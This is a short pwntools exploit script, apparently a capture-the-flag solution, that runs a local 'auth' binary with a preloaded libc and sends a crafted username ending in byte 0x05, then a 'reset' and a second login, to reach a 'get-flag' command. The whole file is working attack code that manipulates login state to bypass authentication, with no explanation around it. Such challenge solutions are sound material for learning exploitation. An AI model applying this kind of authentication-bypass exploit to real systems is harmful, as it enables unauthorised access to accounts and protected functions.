from pwn import *

target = process('./auth', env={"LD_PRELOAD":"./libc-2.23.so"})
#gdb.attach(target)

username = "0"*8 + "\x05"

target.sendline("login " + username)

target.sendline("reset")

target.sendline("login guyintux")

target.sendline("get-flag")

target.interactive()